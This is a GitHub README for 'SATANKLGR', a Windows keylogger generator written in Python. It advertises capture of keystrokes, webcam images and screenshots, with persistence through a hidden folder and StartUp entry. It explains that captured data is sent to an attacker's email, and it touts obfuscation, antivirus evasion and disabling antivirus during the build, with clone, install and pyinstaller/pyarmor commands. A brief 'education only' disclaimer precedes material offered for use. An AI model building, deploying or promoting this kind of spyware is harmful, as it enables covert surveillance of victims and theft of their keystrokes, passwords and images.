# SATANKLGR

![Безымянный](https://user-images.githubusercontent.com/92334349/147391569-5c5192f5-6829-49a3-b43d-9a5eb9d4f597.png)

<p align="right">⛤Keylogger Generator for Windows written in Python⛤</p>
## Disclamer
THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES! DO NOT USE IT TO INFLICT 
DAMAGE TO ANYONE! USING MY APPLICATION YOU ARE AUTHOMATICALLY AGREE WITH ALL RULES AND
TAKE RESPONSIBITITY FOR YOUR ACTION! THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES!
THE DEVELOPER FZGbzuw412 ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE 
CAUSED BY THIS PROGRAM.

## Features
- [x] Keystrokes
- [x] Webcam
- [x] Screenshots
- [x] Persistence

## Intended for:
Windows systems of all versions (Windows 10 is highly recommended)

## Requirements
+ [Python 3.9](https://www.python.org/downloads/release/python-390/).
+ Pillow==8.4.0
+ opencv-python==4.5.3.56
+ pyinstaller==4.6
+ pyarmor==7.2.3

## Usage
```
#clone or download zip archive
git clone https://github.com/FZGbzuw412/SATANKLGR.git

# go to directory with files
cd SATANKLGR 

#install essential requirements
pip3 install -r requirements.txt

#launch the installer
python3 launcher.py

#compile startup.py
pyinstaller --onefile startup.py
```

## How it works
When you launch compiled ```startup.exe``` it authomatically creates a [hidden foulder](https://github.com/FZGbzuw412/SATANKLGR#hidden-foulder) in C disk and move ```SATANKLGR.exe``` to this [foulder](https://github.com/FZGbzuw412/SATANKLGR#hidden-foulder). Then it launches ```SATANKLGR.exe``` from the foulder and the programm appears in Task Manager and works here all of the time. After that moment you can delete ```startup.exe```. Subsequently, the application will add taken screenshots and webcam snaps to the ```Public 3D Objects``` gradually. After app send them to [specified email](https://github.com/FZGbzuw412/SATANKLGR#messages). In case you choose all options it will work the same way, but if you have chosen an option without webcam and screenshots it will not create a foulder. If you generated file containing all the stuff it will add an exeption to the code, so on condition that webcamera is unplugged the programm will not be terminated.

# Note
- This application intended only for Windows Systems. In order to make an .exe file you have to launch [launcher.py](https://github.com/FZGbzuw412/SATANKLGR/blob/main/launcher.py) only on Windows.

- Besides, you need to have python 3.9.0 installed on your PC. Currently it is impossible to make an .exe file of OpenCV using the latest version of pyinstaller
and pyarmor. 

- It is possible to run SATANKLGR on Linux, however you will get only .py file with source code. Afterwards you can go to Windows and compile file to .exe using 
```pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py```

- If you have an antivirus, turn it off when you launch the ```launcher.py```

# Advantages
+ Compatible with all versions of Windows including Windows 10
+ Getting obfuscated .exe file to defend your data from disassembling
+ Fast fixing code if you have any problems
+ Working exclusively with one file, no compounds, no problems
+ Not detected by antiviruses
+ Making hidden foulder in C:\ disk
+ Authomatical removing files after sending to email
+ Adding to StartUp

# Terminating Keylogger
So as to terminate the session of keylogger launch [terminate.bat](https://github.com/FZGbzuw412/SATANKLGR/blob/main/terminate.bat)

# Screenshots
## Generate

![z7IgeP0U2d](https://user-images.githubusercontent.com/92334349/147340454-140a887b-b260-44b5-a47e-647fe9ed7237.gif)


## Launch

![wn84FpnDWU](https://user-images.githubusercontent.com/92334349/147401879-6e9d8012-e293-49f8-b77e-f1e9ddb35bb1.gif)

## Messages

![firefox_5Gp9T9XDPn](https://user-images.githubusercontent.com/92334349/147340577-da4645e8-4bf6-4610-85e4-1564ff48f058.png)

![PicasaPhotoViewer_tnWrOMeImg](https://user-images.githubusercontent.com/92334349/147390780-3f440d08-a720-45a0-bfa3-465012769989.png)

![PicasaPhotoViewer_gjoRMIyQDM](https://user-images.githubusercontent.com/92334349/147390746-9d1aa380-9042-4630-a7aa-2a1145ea116b.png)

## Hidden Foulder

![explorer_idvTX28Ly4](https://user-images.githubusercontent.com/92334349/147340598-a9accbd0-299d-4ce4-9c72-136715023bef.png)

![explorer_7IR4bL2EQP](https://user-images.githubusercontent.com/92334349/147340604-1b5dbc9a-66fc-4711-ab09-668f66a201d1.png)

## Contacts
If you have any suggestions concerning this project refer to FZGbzuw412a@protonmail.com

## Licence
  
Copyright (c) 2021 FZGbzuw412

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
